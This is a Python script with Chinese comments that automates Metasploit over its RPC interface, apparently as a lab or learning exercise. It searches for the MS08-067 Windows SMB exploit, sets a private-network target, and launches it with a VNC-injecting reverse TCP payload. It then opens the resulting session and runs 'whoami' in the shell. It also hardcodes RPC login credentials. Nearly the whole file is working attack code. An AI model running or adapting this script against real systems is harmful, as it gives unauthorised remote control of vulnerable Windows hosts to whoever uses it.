from pymetasploit3.msfrpc import MsfRpcClient

"""
ruby msfrpcd -U hongshulin -P AIni@1314. -f
"""

header = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
client = MsfRpcClient(password="AIni@1314.", username="hongshulin", server="0.0.0.0", ssl=True, port=55553,
                      header=header)

# 查询
search_result = client.modules.search("MS08-067")


full_name = search_result[0]["fullname"]
full_type = search_result[0]["type"]

# 查询详细信息
modules_info = client.modules.use(mtype=full_type, mname=full_name)
for key, value in modules_info.info.items():
    print(key, ":", value)
# print(modules_info.info)

print(modules_info.runoptions)

# 查看模块信息
modules_info.description

# 查看可用目标
modules_info.targets

# 查看可以设置的目标信息
modules_info.default_target

# 设置目标
modules_info.target = 81

# 查找有效载荷
payloads = modules_info.targetpayloads()
# 查看和设置模块选项
modules_info.options
# 查看需要设置的信息
modules_info.missing_required
# 设置信息
modules_info["RHOSTS"] = "192.168.50.130"
# 查看设置后的信息
modules_info.runoptions

# 设置控制台，并返回控制台id
console_id = client.consoles.console().cid
console = client.consoles.console(console_id)
console.run_module_with_output(modules_info, payload='generic/debug_trap')

# 利用 payload
modules_info.execute(payload='windows/vncinject/reverse_tcp_uuid')  # >>> {'job_id': None, 'uuid': 'uojqkda0'} 如果 job_id 为 1 则成功了

# 查看会话列表信息
client.sessions.list
# 使用查看到的会话编号创建一个shell对象
shell = client.sessions.session('1')
# 在shell对象中写入命令
shell.write('whoami')
# 读取shell返回结果
shell.read()